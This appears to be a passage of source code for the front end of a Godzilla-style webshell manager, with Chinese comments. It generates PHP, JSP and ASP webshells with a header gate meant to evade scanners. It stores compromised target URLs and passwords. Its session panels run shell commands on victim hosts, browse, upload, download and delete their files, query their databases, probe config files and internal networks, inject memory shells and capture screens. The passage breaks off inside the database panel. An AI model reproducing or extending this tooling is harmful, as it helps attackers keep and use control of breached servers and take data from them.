"use client";

// webshell-console.tsx — 哥斯拉（Godzilla）风格 Webshell 管理器 UI：
//   主窗：工具栏（添加/编辑/删除/全部测试/生成）+ 目标表格（复选 | URL | 密码 |
//         加密器 | 脚本 | 备注 | 状态），双击行打开会话窗
//   会话窗（深色伪窗口）：标题栏（目标/连接参数/断开）+ 哥斯拉式功能按钮条
//         （信息 文件 命令 数据库 网络 进程 内存马 Servlet Jar 截图 PHP工具 笔记，
//         按载荷动态显示）+ 面板区
//   文件管理器：工具栏（刷新/上传/下载/新建文件/新建文件夹/重命名/删除）+
//         路径栏 + 表格（名称/修改时间/文件大小）
//   命令执行：黑底输出区 + 命令行 + cwd，快捷命令按钮
import React from "react";
import { Card, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { api, type WSTarget } from "@/lib/api";
import {
  PlayIcon, RefreshCw, TrashIcon, PencilIcon, PlusIcon, ZapIcon,
  FolderUpIcon, FilePlusIcon, FolderPlusIcon, PencilLineIcon,
  InfoIcon, FolderIcon, TerminalIcon, DatabaseIcon, NetworkIcon,
  CpuIcon, BugIcon, LayoutGridIcon, PackageIcon, CameraIcon, WrenchIcon,
  NotebookPenIcon, XIcon,
} from "lucide-react";

const SCRIPT_TYPES = ["php", "jsp", "jspx", "asp", "aspx", "py", "node"];
const ENCODERS = ["raw", "aes", "xor"];

function extOps(st: string): string[] {
  if (st === "php") return ["db", "net", "proc", "phptool"];
  if (st === "jsp" || st === "jspx") return ["db", "net", "memshell", "servlet", "jar", "shot"];
  return [];
}

// ==================== 主窗 ====================

export default function WebshellConsole() {
  const [targets, setTargets] = React.useState<WSTarget[]>([]);
  const [q, setQ] = React.useState("");
  const [checked, setChecked] = React.useState<Set<number>>(new Set());
  const [session, setSession] = React.useState<WSTarget | null>(null);
  const [genOpen, setGenOpen] = React.useState(false);
  const [edit, setEdit] = React.useState<Partial<WSTarget> | null>(null);
  const [checking, setChecking] = React.useState(false);
  const [reload, setReload] = React.useState(0);
  const searchDeb = React.useRef<ReturnType<typeof setTimeout> | null>(null);

  const load = React.useCallback(async (query?: string) => {
    try {
      const r = await api.wsTargets(query);
      setTargets(r.data || []);
    } catch { /* ignore */ }
  }, []);
  React.useEffect(() => { load(); }, [load, reload]);

  const onSearch = (v: string) => {
    setQ(v);
    if (searchDeb.current) clearTimeout(searchDeb.current);
    searchDeb.current = setTimeout(() => load(v.trim() || undefined), 300);
  };

  const sel = targets.filter((t) => checked.has(t.id));
  const toggle = (id: number) => {
    setChecked((s) => {
      const n = new Set(s);
      if (n.has(id)) n.delete(id); else n.add(id);
      return n;
    });
  };
  const toggleAll = () => {
    setChecked((s) => (s.size === targets.length ? new Set() : new Set(targets.map((t) => t.id))));
  };

  const delChecked = async () => {
    if (!sel.length || !window.confirm(`删除选中的 ${sel.length} 个目标？`)) return;
    for (const t of sel) await api.wsTargetDelete(t.id);
    setChecked(new Set());
    setReload((n) => n + 1);
  };

  const checkAll = async () => {
    setChecking(true);
    try {
      await api.wsTargetsCheck(checked.size ? Array.from(checked) : []);
      setReload((n) => n + 1);
    } finally { setChecking(false); }
  };

  const openEdit = (t?: WSTarget) => {
    setEdit(t ? { ...t } : { group: "default", encoder: "raw", script_type: "php", url: "", password: "", name: "", note: "", headers: "" });
  };

  const saveEdit = async () => {
    if (!edit?.url?.trim()) return void window.alert("URL 必填");
    await api.wsTargetSave(edit);
    setEdit(null);
    setReload((n) => n + 1);
  };

  return (
    <div className="space-y-2">
      {/* 工具栏（哥斯拉主窗顶部） */}
      <div className="flex flex-wrap items-center gap-2 rounded border bg-muted/30 p-2">
        <Button size="sm" variant="secondary" onClick={() => openEdit()}><PlusIcon className="mr-1 size-4" /> 添加</Button>
        <Button size="sm" variant="outline" disabled={!sel.length} onClick={() => openEdit(sel[0])}><PencilIcon className="mr-1 size-4" /> 编辑</Button>
        <Button size="sm" variant="outline" disabled={!sel.length} onClick={delChecked}><TrashIcon className="mr-1 size-4" /> 删除</Button>
        <Button size="sm" variant="outline" onClick={checkAll} disabled={checking}>
          <RefreshCw className={`mr-1 size-4 ${checking ? "animate-spin" : ""}`} /> {checked.size ? `测试选中(${checked.size})` : "全部测试"}
        </Button>
        <Button size="sm" variant="outline" onClick={() => setGenOpen(!genOpen)}><ZapIcon className="mr-1 size-4" /> 生成</Button>
        <Input className="ml-auto h-8 w-52 text-xs" placeholder="搜索 URL/名称/备注…" value={q} onChange={(e) => onSearch(e.target.value)} />
      </div>

      {/* 目标表格（哥斯拉式：复选|URL|密码|加密器|脚本|备注|状态；双击开窗） */}
      <div className="overflow-hidden rounded border">
        <table className="w-full text-xs">
          <thead className="bg-muted">
            <tr className="text-left text-muted-foreground">
              <th className="w-8 px-2 py-1.5"><input type="checkbox" checked={targets.length > 0 && checked.size === targets.length} onChange={toggleAll} /></th>
              <th>URL 地址</th>
              <th className="w-28">密码</th>
              <th className="w-20">加密器</th>
              <th className="w-16">脚本</th>
              <th className="w-24">分组</th>
              <th>备注</th>
              <th className="w-16">状态</th>
            </tr>
          </thead>
          <tbody>
            {targets.length === 0 && (
              <tr><td colSpan={8} className="py-8 text-center text-muted-foreground">暂无目标——「添加」录入或「生成」后部署</td></tr>
            )}
            {targets.map((t) => (
              <tr
                key={t.id}
                className={`cursor-pointer border-b border-border/40 hover:bg-muted/40 ${checked.has(t.id) ? "bg-primary/5" : ""}`}
                onClick={() => toggle(t.id)}
                onDoubleClick={() => setSession(t)}
              >
                <td className="px-2 py-1"><input type="checkbox" checked={checked.has(t.id)} onClick={(e) => e.stopPropagation()} onChange={() => toggle(t.id)} /></td>
                <td className="py-1 font-mono text-blue-500" title={t.url}>{t.url}</td>
                <td className="font-mono text-muted-foreground">{t.password ? "••••" : "-"}</td>
                <td>{t.encoder}</td>
                <td>{t.script_type}</td>
                <td className="text-muted-foreground">{t.group}</td>
                <td className="truncate text-muted-foreground" title={t.note}>{t.note || (t.name && t.name)}</td>
                <td>
                  <span className={`rounded px-1.5 py-0.5 text-[10px] ${t.alive ? "bg-green-500/15 text-green-600" : t.last_check ? "bg-red-500/15 text-red-500" : "bg-muted text-muted-foreground"}`}>
                    {t.alive ? "连接" : t.last_check ? "断开" : "未测"}
                  </span>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      <div className="text-[10px] text-muted-foreground">双击行打开会话窗口；单机勾选后可编辑/删除/批量测活。</div>

      {/* 编辑/添加对话框 */}
      {edit && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setEdit(null)}>
          <Card className="w-[460px]" onClick={(e) => e.stopPropagation()}>
            <CardContent className="space-y-2 p-3 text-sm">
              <div className="text-sm font-semibold">{edit.id ? "编辑目标" : "添加目标"}</div>
              <Input placeholder="名称（备注列显示）" value={edit.name || ""} onChange={(e) => setEdit({ ...edit, name: e.target.value })} />
              <Input placeholder="URL（http://target/shell.php）" value={edit.url || ""} onChange={(e) => setEdit({ ...edit, url: e.target.value })} />
              <div className="grid grid-cols-4 gap-2">
                <Input placeholder="密码" value={edit.password || ""} onChange={(e) => setEdit({ ...edit, password: e.target.value })} />
                <select className="rounded border bg-transparent p-1.5 text-sm" value={edit.encoder || "raw"} onChange={(e) => setEdit({ ...edit, encoder: e.target.value })}>
                  {ENCODERS.map((x) => <option key={x} value={x}>{x}</option>)}
                </select>
                <select className="rounded border bg-transparent p-1.5 text-sm" value={edit.script_type || "php"} onChange={(e) => setEdit({ ...edit, script_type: e.target.value })}>
                  {SCRIPT_TYPES.map((x) => <option key={x} value={x}>{x}</option>)}
                </select>
                <Input placeholder="分组" value={edit.group || ""} onChange={(e) => setEdit({ ...edit, group: e.target.value })} />
              </div>
              <Input placeholder='附加头 JSON（Gate/UA，如 {"X-Gate":"v"}）' value={edit.headers || ""} onChange={(e) => setEdit({ ...edit, headers: e.target.value })} />
              <textarea className="h-16 w-full rounded border bg-transparent p-2 text-xs" placeholder="备注" value={edit.note || ""} onChange={(e) => setEdit({ ...edit, note: e.target.value })} />
              <div className="flex justify-end gap-2">
                <Button variant="outline" size="sm" onClick={() => setEdit(null)}>取消</Button>
                <Button size="sm" onClick={saveEdit}>保存</Button>
              </div>
            </CardContent>
          </Card>
        </div>
      )}

      {genOpen && <GenerateDialog onClose={() => setGenOpen(false)} />}
      {session && <SessionWindow target={session} onClose={() => { setSession(null); setReload((n) => n + 1); }} />}
    </div>
  );
}

// ==================== 生成对话框 ====================

function GenerateDialog({ onClose }: { onClose: () => void }) {
  const [st, setSt] = React.useState("php");
  const [enc, setEnc] = React.useState("raw");
  const [pwd, setPwd] = React.useState("");
  const [gateHeader, setGateHeader] = React.useState("");
  const [gateValue, setGateValue] = React.useState("");
  const [gen, setGen] = React.useState<{ path: string; code: string; size: number } | null>(null);
  const [busy, setBusy] = React.useState(false);
  const [copied, setCopied] = React.useState(false);

  const run = async () => {
    if (!pwd.trim()) return void window.alert("密码必填");
    setBusy(true);
    try {
      const r = await api.wsGenerate({ script_type: st, encoder: enc, password: pwd, gate_header: gateHeader, gate_value: gateValue });
      setGen(r.data);
    } catch (e) {
      window.alert("生成失败: " + (e instanceof Error ? e.message : String(e)));
    } finally { setBusy(false); }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={onClose}>
      <Card className="w-[560px]" onClick={(e) => e.stopPropagation()}>
        <CardContent className="space-y-2 p-3 text-sm">
          <div className="flex items-center justify-between">
            <div className="text-sm font-semibold">生成 Webshell（Godzilla 生成器）</div>
            <button onClick={onClose}><XIcon className="size-4" /></button>
          </div>
          <div className="grid grid-cols-3 gap-2">
            <select className="rounded border bg-transparent p-1.5" value={st} onChange={(e) => setSt(e.target.value)}>
              {SCRIPT_TYPES.map((x) => <option key={x} value={x}>{x}</option>)}
            </select>
            <select className="rounded border bg-transparent p-1.5" value={enc} onChange={(e) => setEnc(e.target.value)}>
              {ENCODERS.map((x) => <option key={x} value={x}>{x}</option>)}
            </select>
            <Input placeholder="连接密码" value={pwd} onChange={(e) => setPwd(e.target.value)} />
          </div>
          <div className="grid grid-cols-2 gap-2">
            <Input placeholder="Header Gate 头名（可选）" value={gateHeader} onChange={(e) => setGateHeader(e.target.value)} />
            <Input placeholder="Gate 值（缺头 404）" value={gateValue} onChange={(e) => setGateValue(e.target.value)} />
          </div>
          <div className="text-[11px] text-muted-foreground">
            Header Gate：缺校验头直接 404，对抗扫描器。连接目标时把同名头写进「附加头 JSON」。
          </div>
          <Button size="sm" onClick={run} disabled={busy}><PlayIcon className="mr-1 size-4" /> {busy ? "生成中…" : "生成"}</Button>
          {gen && (
            <div className="space-y-1">
              <div className="flex items-center justify-between text-xs text-muted-foreground">
                <span>已存 {gen.path}（{gen.size} 字节）</span>
                <Button variant="outline" size="sm" onClick={async () => { await navigator.clipboard.writeText(gen.code); setCopied(true); setTimeout(() => setCopied(false), 1500); }}>
                  {copied ? "已复制 ✓" : "复制代码"}
                </Button>
              </div>
              <pre className="max-h-64 overflow-auto whitespace-pre-wrap rounded bg-zinc-900 p-2 font-mono text-[11px] text-zinc-200">{gen.code}</pre>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}

// ==================== 会话窗口（哥斯拉式：深色伪窗口 + 功能按钮条） ====================

type PanelKey = "info" | "files" | "cmd" | "db" | "net" | "proc" | "memshell" | "servlet" | "jar" | "shot" | "phptool" | "note";

function SessionWindow({ target, onClose }: { target: WSTarget; onClose: () => void }) {
  const ops = extOps(target.script_type);
  const panels: { key: PanelKey; label: string; icon: React.ReactNode }[] = [
    { key: "info", label: "基础信息", icon: <InfoIcon className="size-4" /> },
    { key: "files", label: "文件管理", icon: <FolderIcon className="size-4" /> },
    { key: "cmd", label: "命令执行", icon: <TerminalIcon className="size-4" /> },
    ...(ops.includes("db") ? [{ key: "db" as PanelKey, label: "数据库", icon: <DatabaseIcon className="size-4" /> }] : []),
    ...(ops.includes("net") ? [{ key: "net" as PanelKey, label: "内网探测", icon: <NetworkIcon className="size-4" /> }] : []),
    ...(ops.includes("proc") ? [{ key: "proc" as PanelKey, label: "进程管理", icon: <CpuIcon className="size-4" /> }] : []),
    ...(ops.includes("memshell") ? [{ key: "memshell" as PanelKey, label: "内存马", icon: <BugIcon className="size-4" /> }] : []),
    ...(ops.includes("servlet") ? [{ key: "servlet" as PanelKey, label: "Servlet", icon: <LayoutGridIcon className="size-4" /> }] : []),
    ...(ops.includes("jar") ? [{ key: "jar" as PanelKey, label: "Jar加载", icon: <PackageIcon className="size-4" /> }] : []),
    ...(ops.includes("shot") ? [{ key: "shot" as PanelKey, label: "远程屏幕", icon: <CameraIcon className="size-4" /> }] : []),
    ...(ops.includes("phptool") ? [{ key: "phptool" as PanelKey, label: "PHP工具", icon: <WrenchIcon className="size-4" /> }] : []),
    { key: "note", label: "笔记", icon: <NotebookPenIcon className="size-4" /> },
  ];
  const [panel, setPanel] = React.useState<PanelKey>("cmd");

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 p-4">
      <div className="flex h-full w-full max-w-[1280px] flex-col overflow-hidden rounded-lg border border-zinc-700 bg-zinc-900 text-zinc-200 shadow-2xl">
        {/* 标题栏 */}
        <div className="flex items-center gap-2 border-b border-zinc-700 bg-zinc-800 px-3 py-2 text-sm">
          <span className="flex gap-1.5">
            <span className="size-3 rounded-full bg-red-500" /><span className="size-3 rounded-full bg-yellow-500" /><span className="size-3 rounded-full bg-green-500" />
          </span>
          <span className="ml-2 font-semibold text-zinc-100">{target.name || target.url}</span>
          <span className="font-mono text-[11px] text-zinc-400">{target.script_type} · {target.encoder} · {target.url}</span>
          <span className={`ml-2 rounded px-1.5 text-[10px] ${target.alive ? "bg-green-500/20 text-green-400" : "bg-zinc-700 text-zinc-400"}`}>
            {target.alive ? "已连接" : "未验证"}
          </span>
          <button className="ml-auto text-zinc-400 hover:text-red-400" onClick={onClose} title="断开会话"><XIcon className="size-4" /></button>
        </div>
        {/* 功能按钮条（哥斯拉会话顶栏） */}
        <div className="flex flex-wrap gap-1 border-b border-zinc-700 bg-zinc-800/60 px-2 py-1.5">
          {panels.map((p) => (
            <button
              key={p.key}
              className={`flex items-center gap-1 rounded px-2.5 py-1.5 text-xs ${panel === p.key ? "bg-blue-600 font-semibold text-white" : "text-zinc-300 hover:bg-zinc-700"}`}
              onClick={() => setPanel(p.key)}
            >
              {p.icon}{p.label}
            </button>
          ))}
        </div>
        {/* 面板区 */}
        <div className="min-h-0 flex-1 overflow-auto bg-zinc-900 p-3">
          {panel === "info" && <InfoPanel target={target} />}
          {panel === "files" && <FilesPanel target={target} />}
          {panel === "cmd" && <CmdPanel target={target} />}
          {panel === "db" && <DBPanel target={target} />}
          {panel === "net" && <NetPanel target={target} />}
          {panel === "proc" && <ProcPanel target={target} />}
          {panel === "memshell" && <MemshellPanel target={target} />}
          {panel === "servlet" && <ServletPanel target={target} />}
          {panel === "jar" && <JarPanel target={target} />}
          {panel === "shot" && <ShotPanel target={target} />}
          {panel === "phptool" && <PHPToolPanel target={target} />}
          {panel === "note" && <NotePanel target={target} />}
        </div>
      </div>
    </div>
  );
}

// ---------- 深色面板共通小件 ----------

const DInput = (props: React.InputHTMLAttributes<HTMLInputElement>) => (
  <input {...props} className={`rounded border border-zinc-700 bg-zinc-800 px-2 py-1 font-mono text-xs text-zinc-200 placeholder:text-zinc-500 outline-none focus:border-blue-500 ${props.className || ""}`} />
);
const DBtn = ({ children, ...props }: React.ButtonHTMLAttributes<HTMLButtonElement>) => (
  <button {...props} className={`flex items-center gap-1 rounded border border-zinc-700 bg-zinc-800 px-2 py-1 text-[11px] text-zinc-200 hover:bg-zinc-700 disabled:opacity-40 ${props.className || ""}`}>{children}</button>
);
const DPre = ({ children }: { children: React.ReactNode }) => (
  <pre className="overflow-auto whitespace-pre-wrap rounded border border-zinc-700 bg-black/60 p-2 font-mono text-[11px] leading-relaxed text-zinc-300">{children}</pre>
);

// ---------- 执行钩子 ----------

function useRunner(target: WSTarget) {
  const [busy, setBusy] = React.useState(false);
  const base = { url: target.url, password: target.password, encoder: target.encoder, script_type: target.script_type, headers: target.headers || "" };
  const exec = async (op: string, extra: Record<string, unknown>) => {
    setBusy(true);
    try {
      const r = await api.webshellExec({ ...base, op, timeout: 60, ...extra } as never);
      return r.data;
    } catch (e) {
      return { ok: false, output: "", cwd: "", error: e instanceof Error ? e.message : String(e), data_len: 0 } as { ok: boolean; output: string; cwd: string; error: string; data_len: number; data_b64?: string };
    } finally { setBusy(false); }
  };
  const ext = async (op: string, e: Record<string, unknown>) => {
    setBusy(true);
    try {
      const r = await api.webshellExt({ ...base, op, timeout: 120, ext: e });
      return r.data;
    } catch (err) {
      return { ok: false, output: "", error: err instanceof Error ? err.message : String(err), data_len: 0 } as { ok: boolean; output: string; error: string; data_len: number; data_b64?: string };
    } finally { setBusy(false); }
  };
  return { busy, exec, ext };
}

// ---------- 基础信息 ----------

function InfoPanel({ target }: { target: WSTarget }) {
  const [info, setInfo] = React.useState("");
  const { busy, exec } = useRunner(target);
  const probe = async () => {
    const phpCmd = 'echo "PHP_OS=".PHP_OS."; PHPVER=".PHP_VERSION;';
    const r = await exec("exec", { cmd: target.script_type === "php" ? phpCmd : "uname -a; id; whoami" });
    setInfo(r.ok ? r.output : "[失败] " + r.error);
  };
  return (
    <div className="space-y-2 text-sm">
      <div className="grid grid-cols-2 gap-1 text-xs md:grid-cols-3">
        {[["URL", target.url], ["载荷", `${target.script_type}/${target.encoder}`], ["存活", target.alive ? "是" : "未测/否"], ["最近检测", target.last_check || "-"], ["分组", target.group], ["附加头", target.headers || "-"]].map(([k, v]) => (
          <div key={k} className="rounded border border-zinc-700 bg-zinc-800/60 p-1.5">
            <span className="text-zinc-500">{k}：</span>
            <span className="break-all font-mono text-zinc-200">{v}</span>
          </div>
        ))}
      </div>
      <DBtn onClick={probe} disabled={busy}><PlayIcon className="size-3.5" /> 采集目标基础信息</DBtn>
      {info && <DPre>{info}</DPre>}
    </div>
  );
}

// ---------- 命令执行（哥斯拉：输出区+命令行） ----------

function CmdPanel({ target }: { target: WSTarget }) {
  const [out, setOut] = React.useState("");
  const [cmd, setCmd] = React.useState("");
  const [cwd, setCwd] = React.useState("");
  const { busy, exec } = useRunner(target);
  const hist = React.useRef<string[]>([]);
  const hidx = React.useRef(-1);

  const run = async (c?: string) => {
    const command = (c ?? cmd).trim();
    if (!command) return;
    setOut((o) => `${o}${o ? "\n" : ""}$ ${command}\n`);
    const r = await exec("exec", { cmd: command, cwd });
    if (r.cwd) setCwd(r.cwd);
    setOut((o) => o + (r.ok ? r.output : "[错误] " + r.error) + "\n");
    hist.current.push(command);
    hidx.current = -1;
    setCmd("");
  };

  const quick = target.script_type === "php"
    ? ["whoami", "id", "uname -a", "ip a", "netstat -antp", "ps aux | head -30", "crontab -l"]
    : ["whoami", "id", "uname -a", "ipconfig", "netstat -ano", "tasklist"];

  return (
    <div className="flex h-full flex-col gap-2">
      <div className="flex flex-wrap gap-1">
        {quick.map((c) => (
          <button key={c} className="rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 font-mono text-[10px] text-zinc-400 hover:text-zinc-100" onClick={() => run(c)} disabled={busy}>{c}</button>
        ))}
      </div>
      <pre className="min-h-0 flex-1 overflow-auto whitespace-pre-wrap rounded border border-zinc-700 bg-black p-2 font-mono text-[11px] leading-relaxed text-green-400">{out || "（命令在目标机执行；cwd 自动跟随）"}</pre>
      <div className="flex items-center gap-1">
        <span className="shrink-0 rounded bg-blue-900/60 px-1.5 py-1 font-mono text-[10px] text-blue-300">{cwd || "cwd"}</span>
        <DInput
          className="flex-1"
          placeholder="命令（Enter 执行，↑↓ 历史）"
          value={cmd}
          disabled={busy}
          onChange={(e) => setCmd(e.target.value)}
          onKeyDown={(e) => {
            if (e.key === "Enter") run();
            if (e.key === "ArrowUp") {
              e.preventDefault();
              const h = hist.current;
              if (!h.length) return;
              hidx.current = hidx.current < 0 ? h.length - 1 : Math.max(0, hidx.current - 1);
              setCmd(h[hidx.current]);
            }
            if (e.key === "ArrowDown") {
              e.preventDefault();
              const h = hist.current;
              if (hidx.current >= 0 && hidx.current < h.length - 1) { hidx.current++; setCmd(h[hidx.current]); }
              else { hidx.current = -1; setCmd(""); }
            }
          }}
        />
        <DBtn onClick={() => run()} disabled={busy}><PlayIcon className="size-3.5" /> 执行</DBtn>
      </div>
    </div>
  );
}

// ---------- 文件管理（哥斯拉：工具栏+路径栏+表格） ----------

interface FileRow { name: string; size: number; is_dir: boolean; mtime: number }

function FilesPanel({ target }: { target: WSTarget }) {
  const [rows, setRows] = React.useState<FileRow[]>([]);
  const [cwd, setCwd] = React.useState("");
  const [pathInput, setPathInput] = React.useState("");
  const [err, setErr] = React.useState("");
  const [selFile, setSelFile] = React.useState<FileRow | null>(null);
  const [preview, setPreview] = React.useState<{ name: string; text: string; b64?: string } | null>(null);
  const { busy, exec } = useRunner(target);
  const supported = ["php", "jsp", "jspx", "py", "node"].includes(target.script_type);

  const ls = async (p?: string) => {
    setErr("");
    const dest = p ?? cwd;
    const r = await exec("list", { path: dest });
    if (!r.ok) { setErr(r.error); setRows([]); return; }
    try {
      const arr = JSON.parse(r.output.trim()) as FileRow[];
      arr.sort((a, b) => (b.is_dir ? 1 : 0) - (a.is_dir ? 1 : 0) || a.name.localeCompare(b.name));
      setRows(arr);
      const nc = r.cwd || dest || "";
      setCwd(nc);
      setPathInput(nc);
    } catch {
      setErr("目录解析失败：" + r.output.slice(0, 200));
    }
  };

  React.useEffect(() => { if (supported) ls(); }, [supported]); // eslint-disable-line react-hooks/exhaustive-deps

  const jpath = (n: string) => (cwd ? cwd.replace(/\/+$/, "") + "/" : "") + n;

  const read = async (f: FileRow) => {
    const r = await exec("read", { path: jpath(f.name) });
    if (!r.ok) return void window.alert("读取失败: " + r.error);
    const text = r.data_b64 ? atob(r.data_b64) : "";
    const clean = text.slice(0, 2000);
    const bad = Array.from(clean).filter((ch) => { const c = ch.codePointAt(0) || 0; return c < 32 && c !== 10 && c !== 13 && c !== 9; }).length;
    setPreview({ name: jpath(f.name), text: bad * 10 <= clean.length ? text.slice(0, 50000) : "（二进制文件，用「下载」保存）", b64: r.data_b64 });
  };

  const download = (f: FileRow) => {
    if (!preview?.b64 || preview.name !== jpath(f.name)) return void window.alert("先「打开」该文件再下载");
    const bin = atob(preview.b64);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    const a = document.createElement("a");
    a.href = URL.createObjectURL(new Blob([bytes]));
    a.download = f.name;
    a.click();
  };

  const del = async (f: FileRow) => {
    if (!window.confirm(`删除 ${f.is_dir ? "目录" : "文件"} ${f.name}？`)) return;
    const r = await exec("delete", { path: jpath(f.name) });
    if (!r.ok) return void window.alert(r.error);
    ls();
  };

  const rename = async (f: FileRow) => {
    const n = window.prompt(`重命名 ${f.name} 为`, f.name);
    if (!n || n === f.name) return;
    const r = await exec("rename", { path: jpath(f.name), new_path: jpath(n) });
    if (!r.ok) return void window.alert(r.error);
    ls();
  };

  const mkdir = async () => {
    const n = window.prompt("新目录名");
    if (!n) return;
    const r = await exec("mkdir", { path: jpath(n) });
    if (!r.ok) return void window.alert(r.error);
    ls();
  };

  const touch = async () => {
    const n = window.prompt("新文件名");
    if (!n) return;
    const r = await exec("write", { path: jpath(n), content: "" });
    if (!r.ok) return void window.alert(r.error);
    ls();
  };

  const upload = async () => {
    const inp = document.createElement("input");
    inp.type = "file";
    inp.onchange = async () => {
      const f = inp.files?.[0];
      if (!f) return;
      const b64 = await new Promise<string>((res) => {
        const fr = new FileReader();
        fr.onload = () => res(String(fr.result).split(",")[1] || "");
        fr.readAsDataURL(f);
      });
      const r = await exec("write", { path: jpath(f.name), content_b64: b64 });
      if (!r.ok) return void window.alert("上传失败: " + r.error);
      ls();
    };
    inp.click();
  };

  if (!supported) return <div className="py-8 text-center text-sm text-zinc-500">{target.script_type} 载荷不支持文件管理（仅 php/jsp/jspx/py/node）</div>;

  return (
    <div className="flex h-full flex-col gap-2">
      {/* 工具栏（哥斯拉文件管理器） */}
      <div className="flex flex-wrap items-center gap-1">
        <DBtn onClick={() => ls(cwd)} disabled={busy}><RefreshCw className={`size-3.5 ${busy ? "animate-spin" : ""}`} /> 刷新</DBtn>
        <DBtn onClick={upload}><FolderUpIcon className="size-3.5" /> 上传</DBtn>
        <DBtn onClick={() => selFile && !selFile.is_dir ? download(selFile) : window.alert("先选中文件并「打开」")}><FolderUpIcon className="size-3.5 rotate-180" /> 下载</DBtn>
        <DBtn onClick={touch}><FilePlusIcon className="size-3.5" /> 新建文件</DBtn>
        <DBtn onClick={mkdir}><FolderPlusIcon className="size-3.5" /> 新建目录</DBtn>
        <DBtn onClick={() => selFile && rename(selFile)} disabled={!selFile}><PencilLineIcon className="size-3.5" /> 重命名</DBtn>
        <DBtn onClick={() => selFile && del(selFile)} disabled={!selFile} className="hover:!bg-red-900/50"><TrashIcon className="size-3.5" /> 删除</DBtn>
        <span className="mx-2 h-4 w-px bg-zinc-700" />
        <DBtn onClick={() => ls(cwd.includes("/") ? cwd.replace(/\/[^/]+$/, "") : "..")}>↑ 上级</DBtn>
        <DInput className="min-w-0 flex-1" value={pathInput} onChange={(e) => setPathInput(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter") ls(pathInput); }} placeholder="路径（Enter 跳转）" />
      </div>
      {err && <div className="rounded border border-red-800 bg-red-950/50 p-1.5 text-xs text-red-400">{err}</div>}
      {/* 表格 */}
      <div className="min-h-0 flex-1 overflow-auto rounded border border-zinc-700">
        <table className="w-full text-xs">
          <thead className="sticky top-0 bg-zinc-800">
            <tr className="text-left text-zinc-400">
              <th className="py-1.5 pl-2">名称</th>
              <th className="w-40">修改时间</th>
              <th className="w-24">文件大小</th>
            </tr>
          </thead>
          <tbody>
            {rows.length === 0 && <tr><td colSpan={3} className="py-6 text-center text-zinc-500">{busy ? "加载中…" : "空目录（在路径栏输入路径回车）"}</td></tr>}
            {rows.map((f) => (
              <tr
                key={f.name}
                className={`cursor-pointer border-b border-zinc-800 hover:bg-zinc-800/70 ${selFile?.name === f.name ? "bg-blue-900/30" : ""}`}
                onClick={() => setSelFile(f)}
                onDoubleClick={() => (f.is_dir ? ls(jpath(f.name)) : read(f))}
              >
                <td className="py-1 pl-2 font-mono">
                  {f.is_dir
                    ? <span className="font-semibold text-blue-400">📁 {f.name}</span>
                    : <span className="text-zinc-200">📄 {f.name}</span>}
                </td>
                <td className="text-zinc-500">{f.mtime ? new Date(f.mtime * 1000).toLocaleString() : "-"}</td>
                <td className="text-zinc-500">{f.is_dir ? "目录" : fmtSize(f.size)}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
      <div className="text-[10px] text-zinc-500">双击进入目录 / 打开文件；单击选中后用工具栏操作。</div>
      {preview && (
        <div className="space-y-1">
          <div className="text-xs text-zinc-400">预览：{preview.name}</div>
          <DPre>{preview.text}</DPre>
        </div>
      )}
    </div>
  );
}

function fmtSize(n: number) {
  if (n < 1024) return `${n}B`;
  if (n < 1048576) return `${(n / 1024).toFixed(1)}K`;
  return `${(n / 1048576).toFixed(1)}M`;
}

// ---------- 数据库 ----------

function DBPanel({ target }: { target: WSTarget }) {
  const [cfg, setCfg] = React.useState({ db_type: "mysql", host: "127.0.0.1", port: "3306", user: "root", pass: "", db: "" });
  const [sql, setSql] = React.useState("SELECT 1");
  const [result, setResult] = React.useState<{ columns: string[]; rows: Record<string, unknown>[]; affected?: number } | null>(null);
  const [err, setErr] = React.useState("");
  const { busy, ext } = useRunner(target);

  const run = async () => {
    setErr("");
    const r = await ext("db_exec", cfg);
    if (!r.ok) { setErr(r.error || r.output); setResult(null); return; }
    try {
      const j = JSON.parse(r.output.trim());
      if (!j.ok) { setErr(j.error || "SQL 失败"); setResult(null); return; }
      setResult({ columns: j.columns || [], rows: j.rows || [], affected: j.affected });
    } catch {
      setErr("解析失败：" + r.output.slice(0, 300));
    }
  };
  const probe = async () => {
    const r = await ext("db_probe", {});
    setErr(r.ok ? r.output : r.error);
  };

  return (
    <div className="space-y-2 text-sm">
      <div className="grid grid-cols-3 gap-1 text-xs md:grid-cols-6">
        <select className="rounded border border-zinc-700 bg-zinc-800 p-1 text-zinc-200" value={cfg.db_type} onChange={(e) => { const t = e.target.value; setCfg({ ...cfg, db_type: t, port: t === "mysql" ? "3306" : t === "pgsql" ? "5432" : cfg.port }); }}>
          <option value="mysql">mysql</option><option value="pgsql">pgsql</option>
          {target.script_type === "php" && <option value="sqlite">sqlite</option>}
        </select>
        <DInput placeholder="host" value={cfg.host} onChange={(e) => setCfg({ ...cfg, host: e.target.value })} />
        <DInput placeholder="port" value={cfg.port} onChange={(e) => setCfg({ ...cfg, port: e.target.value })} />
        <DInput placeholder="user" value={cfg.user} onChange={(e) => setCfg({ ...cfg, user: e.target.value })} />
        <DInput placeholder="pass" type="password" value={cfg.pass} onChange={(e) => setCfg({ ...cfg, pass: e.target.value })} />
        <DInput placeholder={cfg.db_type === "sqlite" ? "db 文件路径" : "database"} value={cfg.db} onChange={(e) => setCfg({ ...cfg, db: e.target.value })} />
      </div>
      <div className="flex gap-1">
        {["SHOW DATABASES", "SHOW TABLES", "SELECT version()", "SELECT user()"].map((s) => (
          <button key={s} className="rounded border border-zinc-700 bg-zinc-800 px-1.5 py-0.5 font-mono text-[10px] text-zinc-400 hover:text-zinc-100" onClick={() => setSql(s)}>{s}</button>
        ))}
        <DBtn className="ml-auto" onClick={probe} disabled={busy}>探测配置文件</DBtn>
      </div>
